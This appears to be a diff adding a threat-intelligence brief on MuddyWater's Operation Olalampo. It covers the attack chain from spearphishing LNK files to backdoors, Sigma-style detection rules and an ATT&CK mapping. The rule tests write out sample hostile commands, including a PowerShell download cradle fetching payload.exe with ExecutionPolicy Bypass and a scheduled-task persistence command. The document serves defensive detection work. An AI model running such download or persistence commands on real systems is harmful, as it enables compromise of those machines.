@@ -1,0 +1,148 @@
+id: brief-2024-01-29-muddywater-olalampo
+slug: 2024-01-muddywater-olalampo
+title: MuddyWater Targeting Middle Eastern Entities in Operation Olalampo
+summary: MuddyWater APT group is conducting Operation Olalampo, targeting Middle Eastern organizations with a multi-stage attack involving malicious LNK files, obfuscated PowerShell scripts, and custom backdoors for data exfiltration.
+severity: high
+threat_actor: MuddyWater
+published_at: "2026-02-21T15:17:08Z"
+content: |
+    ## Overview
+
+    Operation Olalampo is a campaign attributed to the MuddyWater APT group, known for its cyber espionage activities targeting Middle Eastern entities. Starting in late 2025, the campaign employs a multi-stage attack chain. Initial infection vectors include spearphishing emails containing malicious LNK files disguised as legitimate documents or security updates. These LNK files execute obfuscated PowerShell scripts designed to evade detection. The PowerShell scripts download and execute further payloads, ultimately leading to the deployment of custom backdoors for persistent access and data exfiltration. MuddyWater aims to steal sensitive information, conduct espionage, and potentially disrupt targeted organizations within the Middle East.
+
+    ## Attack Chain
+
+    1. Initial Access: Victims receive spearphishing emails with malicious LNK files attached.
+    2. LNK Execution: The user clicks the LNK file, triggering the execution of an embedded PowerShell command.
+    3. PowerShell Obfuscation: The PowerShell script is heavily obfuscated to avoid signature-based detection.
+    4. Payload Download: The PowerShell script downloads a second-stage payload from a remote server using `Invoke-WebRequest`.
+    5. Persistence: The downloaded payload establishes persistence, often through registry modification or scheduled tasks using `schtasks.exe`.
+    6. Custom Backdoor Deployment: A custom backdoor is installed on the compromised system, providing remote access to the attacker.
+    7. Lateral Movement: The attackers use tools like `net.exe` and `PsExec` to move laterally within the network.
+    8. Data Exfiltration: The attackers exfiltrate sensitive data to attacker-controlled servers, leveraging tools like `curl.exe` or custom scripts.
+
+    ## Impact
+
+    Operation Olalampo primarily targets organizations in the Middle East. Successful attacks can lead to the theft of sensitive data, intellectual property, and confidential communications. This can result in significant financial losses, reputational damage, and disruption of services for affected organizations. The exfiltration of sensitive information can also be used for further espionage activities or sold on the dark web, potentially impacting national security.
+tags:
+    - muddywater
+    - apt
+    - spearphishing
+    - powershell
+    - middle-east
+references:
+    - https://www.group-ib.com/blog/muddywater-operation-olalampo/
+    - https://www.reddit.com/r/blueteamsec/comments/1ratmlt/operation_olalampo_inside_muddywaters_latest/
+rules:
+    - title: Detect LNK File Executing PowerShell
+      description: Detects LNK files executing PowerShell, a common technique used by MuddyWater for initial access.
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection
+        selection:
+            Image|endswith: \powershell.exe
+            ParentImage|endswith: .lnk
+      level: high
+      tags:
+        - attack.initial_access
+        - attack.t1566.001
+        - attack.execution
+        - attack.t1202
+      tests:
+        positive:
+            - name: LNK executing powershell
+              data:
+                - CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Users\Public\Documents\Important_Update.lnk
+        negative:
+            - name: PowerShell executed by user
+              data:
+                - CommandLine: powershell.exe -File C:\Users\User\Documents\script.ps1
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\explorer.exe
+    - title: Detect Suspicious PowerShell Download Cradle
+      description: Detects PowerShell scripts using Invoke-WebRequest to download files.
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection
+        selection:
+            CommandLine|contains: Invoke-WebRequest
+            Image|endswith: \powershell.exe
+      level: medium
+      tags:
+        - attack.execution
+        - attack.t1059.001
+        - attack.command_and_control
+        - attack.t1105
+      tests:
+        positive:
+            - name: PowerShell downloading file
+              data:
+                - CommandLine: powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile C:\Users\Public\payload.exe
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\explorer.exe
+        negative:
+            - name: Legitimate PowerShell use
+              data:
+                - CommandLine: powershell.exe -File C:\Scripts\normal_script.ps1
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\explorer.exe
+    - title: Detect Schtasks Persistence
+      description: Detects creation of scheduled tasks for persistence
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection
+        selection:
+            CommandLine|contains: /create
+            Image|endswith: \schtasks.exe
+      level: medium
+      tags:
+        - attack.persistence
+        - attack.t1053.005
+      tests:
+        positive:
+            - name: Schtasks creates scheduled task
+              data:
+                - CommandLine: schtasks /create /tn "MyTask" /tr C:\Windows\System32\calc.exe /sc minute /mo 1
+                  Image: C:\Windows\System32\schtasks.exe
+                  ParentImage: C:\Windows\System32\cmd.exe
+        negative:
+            - name: Schtasks queries scheduled task
+              data:
+                - CommandLine: schtasks /query /fo LIST /tn "MyTask"
+                  Image: C:\Windows\System32\schtasks.exe
+                  ParentImage: C:\Windows\System32\cmd.exe
+ttps:
+    - tactic_id: TA0001
+      tactic_name: Initial Access
+      technique_id: T1566
+      technique_name: Phishing
+      subtechnique_id: T1566.001
+      subtechnique_name: Spearphishing Attachment
+    - tactic_id: TA0002
+      tactic_name: Execution
+      technique_id: T1059.001
+      technique_name: 'Command and Scripting Interpreter: PowerShell'
+    - tactic_id: TA0003
+      tactic_name: Persistence
+      technique_id: T1053.005
+      technique_name: 'Scheduled Task/Job: Scheduled Task'
+    - tactic_id: TA0007
+      tactic_name: Discovery
+      technique_id: T1016
+      technique_name: System Network Configuration Discovery
+    - tactic_id: TA0011
+      tactic_name: Command and Control
+      technique_id: T1105
+      technique_name: Remote File Copy
+    - tactic_id: TA0010
+      tactic_name: Exfiltration
+      technique_id: T1041
+      technique_name: Exfiltration Over C2 Channel
